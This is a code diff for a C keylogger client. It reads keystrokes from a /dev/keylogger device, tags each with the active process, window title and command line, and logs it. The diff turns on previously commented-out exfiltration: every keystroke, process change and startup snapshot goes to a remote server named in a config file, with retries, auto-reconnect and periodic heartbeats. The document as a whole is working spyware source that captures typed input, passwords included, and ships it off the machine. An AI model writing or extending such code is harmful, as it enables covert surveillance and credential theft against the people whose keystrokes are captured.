@@ -2,26 +2,98 @@
 #include <signal.h>
 #include <stdbool.h>
 #include <unistd.h>
+#include <time.h>
+#include <errno.h>
+#include <string.h>
 #include "device_client.h"
 #include "logger.h"
 #include "network_client.h"
 #include "keymap.h"
 #include "process_tracker.h"
 
-#define MAX_KEYS 10
-#define MAX_KEY_LEN 32
+#define MAX_RETRY_COUNT 3
+#define RETRY_DELAY_MS 1000
+#define HEARTBEAT_INTERVAL 30  // Send heartbeat every 30 seconds
 
 static volatile bool running = true;
-static char key_buffer[MAX_KEYS][MAX_KEY_LEN];
-static int key_count = 0;
-static unsigned long last_key_time = 0;
-#define KEY_TIMEOUT 1000  // 1 second timeout for key combinations
 static struct process_info current_process = {0};
+static time_t last_heartbeat = 0;
+static bool network_connected = false;
 
 void handle_sigint(int sig) {
     (void)sig;
     running = false;
     printf("\nExiting program...\n");
+}
+
+// Get current timestamp in ISO 8601 format
+static void get_timestamp(char *timestamp, size_t size) {
+    time_t now = time(NULL);
+    struct tm *tm_info = localtime(&now);
+    strftime(timestamp, size, "%Y-%m-%dT%H:%M:%S%z", tm_info);
+}
+
+// Send data to server with retry mechanism
+static int send_to_server_with_retry(const char *data, size_t len) {
+    if (!network_connected) {
+        return -1;
+    }
+    
+    int retry_count = 0;
+    while (retry_count < MAX_RETRY_COUNT) {
+        int result = network_client_send(data, len);
+        if (result >= 0) {
+            return result;  // Success
+        }
+        
+        retry_count++;
+        if (retry_count < MAX_RETRY_COUNT) {
+            printf("Failed to send data, retrying in %d ms... (attempt %d/%d)\n", 
+                   RETRY_DELAY_MS, retry_count, MAX_RETRY_COUNT);
+            usleep(RETRY_DELAY_MS * 1000);
+        }
+    }
+    
+    printf("Failed to send data after %d attempts\n", MAX_RETRY_COUNT);
+    network_connected = false;  // Mark as disconnected
+    return -1;
+}
+
+// Send heartbeat to keep connection alive
+static void send_heartbeat(void) {
+    time_t now = time(NULL);
+    if (now - last_heartbeat >= HEARTBEAT_INTERVAL) {
+        char heartbeat_msg[256];
+        char timestamp[64];
+        get_timestamp(timestamp, sizeof(timestamp));
+        
+        snprintf(heartbeat_msg, sizeof(heartbeat_msg), 
+                "[HEARTBEAT] Timestamp=%s, PID=%d, Process=%s\n",
+                timestamp, current_process.pid, current_process.name);
+        
+        if (send_to_server_with_retry(heartbeat_msg, strlen(heartbeat_msg)) >= 0) {
+            last_heartbeat = now;
+        }
+    }
+}
+
+// Try to reconnect to server
+static bool try_reconnect(void) {
+    printf("Attempting to reconnect to server...\n");
+    network_client_cleanup();
+    
+    // Try to initialize network client
+    if (network_client_init("config.env") < 0) {
+        if (network_client_init("user/config.env") < 0) {
+            printf("Failed to reconnect to server\n");
+            return false;
+        }
+    }
+    
+    network_connected = true;
+    last_heartbeat = time(NULL);
+    printf("Successfully reconnected to server\n");
+    return true;
 }
 
 int main(void) {
@@ -35,18 +107,27 @@ int main(void) {
     }
 
     // Initialize network client
-    // if (network_client_init("config.env") < 0) {
-    //     if (network_client_init("user/config.env") < 0) {
-    //         fprintf(stderr, "Failed to initialize network client\n");
-    //         return 1;
-    //     }
-    // }
+    if (network_client_init("config.env") < 0) {
+        if (network_client_init("user/config.env") < 0) {
+            fprintf(stderr, "Failed to initialize network client\n");
+            // Continue without network - log locally only
+            network_connected = false;
+        } else {
+            network_connected = true;
+            last_heartbeat = time(NULL);
+        }
+    } else {
+        network_connected = true;
+        last_heartbeat = time(NULL);
+    }
 
     // Initialize device client
     if (device_client_init("/dev/keylogger") < 0) {
         fprintf(stderr, "Failed to initialize device client\n");
         process_tracker_cleanup();
-        // network_client_cleanup();
+        if (network_connected) {
+            network_client_cleanup();
+        }
         return 1;
     }
 
@@ -54,16 +135,37 @@ int main(void) {
         fprintf(stderr, "Failed to open log file\n");
         device_client_cleanup();
         process_tracker_cleanup();
-        // network_client_cleanup();
+        if (network_connected) {
+            network_client_cleanup();
+        }
         return 1;
     }
 
     printf("Keylogger started. Reading from /dev/keylogger\n");
+    if (network_connected) {
+        printf("Network client connected to server\n");
+    } else {
+        printf("Network client disabled - logging locally only\n");
+    }
 
     // Get initial process info
     if (process_tracker_get_active_process(&current_process) == 0) {
         printf("Initial process: PID=%d, Name=%s, Window=%s\n", 
                current_process.pid, current_process.name, current_process.window_title);
+        
+        // Send initial process info to server
+        if (network_connected) {
+            char initial_process_msg[2048];
+            char timestamp[64];
+            get_timestamp(timestamp, sizeof(timestamp));
+            
+            snprintf(initial_process_msg, sizeof(initial_process_msg), 
+                    "[INITIAL_PROCESS] PID=%d, Name=%s, Cmd=%s, Window=%s, Timestamp=%s\n",
+                    current_process.pid, current_process.name, 
+                    current_process.cmdline, current_process.window_title, timestamp);
+            
+            send_to_server_with_retry(initial_process_msg, strlen(initial_process_msg));
+        }
     }
 
     while (running) {
@@ -71,7 +173,7 @@ int main(void) {
         static int check_counter = 0;
         check_counter++;
         
-        if (check_counter >= 5) {  // Check every 5 iterations instead of 10
+        if (check_counter >= 5) {
             check_counter = 0;
             if (process_tracker_has_changed()) {
                 if (process_tracker_get_active_process(&current_process) == 0) {
@@ -82,18 +184,26 @@ int main(void) {
                     printf("Window: %s\n", current_process.window_title);
                     printf("=====================\n");
                     
-                    // Log process change
+                    // Log process change locally
                     char process_log[2048];
+                    char timestamp[64];
+                    get_timestamp(timestamp, sizeof(timestamp));
+                    
                     snprintf(process_log, sizeof(process_log), 
-                            "[PROCESS_CHANGE] PID=%d, Name=%s, Cmd=%s, Window=%s\n",
+                            "[PROCESS_CHANGE] PID=%d, Name=%s, Cmd=%s, Window=%s, Timestamp=%s\n",
                             current_process.pid, current_process.name, 
-                            current_process.cmdline, current_process.window_title);
+                            current_process.cmdline, current_process.window_title, timestamp);
                     logger_write(process_log);
                     
                     // Send process change notification to server
-                    // if (network_client_send(process_log, strlen(process_log)) < 0) {
-                    //     fprintf(stderr, "Failed to send process change to server\n");
-                    // }
+                    if (network_connected) {
+                        if (send_to_server_with_retry(process_log, strlen(process_log)) < 0) {
+                            // Try to reconnect if send failed
+                            if (!try_reconnect()) {
+                                printf("Warning: Could not reconnect to server\n");
+                            }
+                        }
+                    }
                 }
             }
         }
@@ -104,27 +214,54 @@ int main(void) {
             
             // Create metadata with process info
             char output[4096];
+            char timestamp[64];
+            get_timestamp(timestamp, sizeof(timestamp));
+            
             snprintf(output, sizeof(output), 
-                    "[KEYSTROKE] PID=%d, Process=%s, Window=%s, Data=%s\n",
+                    "[KEYSTROKE] PID=%d, Process=%s, Window=%s, Data=%s, Timestamp=%s\n",
                     current_process.pid, current_process.name, 
-                    current_process.window_title, buf);
+                    current_process.window_title, buf, timestamp);
             
             printf("Received: %s", output);
             logger_write(output);
 
-            // send to server
-            // if (network_client_send(output, strlen(output)) < 0) {
-            //     fprintf(stderr, "Failed to send keys to server\n");
-            // }
+            // Send to server
+            if (network_connected) {
+                if (send_to_server_with_retry(output, strlen(output)) < 0) {
+                    // Try to reconnect if send failed
+                    if (!try_reconnect()) {
+                        printf("Warning: Could not reconnect to server\n");
+                    }
+                }
+            }
 
             fflush(stdout);
         } else if (len == 0) {
             usleep(10000); 
         }
+        
+        // Send heartbeat periodically
+        if (network_connected) {
+            send_heartbeat();
+        }
     }
+    
+    // Send shutdown notification
+    if (network_connected) {
+        char shutdown_msg[256];
+        char timestamp[64];
+        get_timestamp(timestamp, sizeof(timestamp));
+        
+        snprintf(shutdown_msg, sizeof(shutdown_msg), 
+                "[SHUTDOWN] Timestamp=%s\n", timestamp);
+        send_to_server_with_retry(shutdown_msg, strlen(shutdown_msg));
+    }
+    
     logger_close();
     device_client_cleanup();
     process_tracker_cleanup();
-    // network_client_cleanup();
+    if (network_connected) {
+        network_client_cleanup();
+    }
     return 0;
 } 
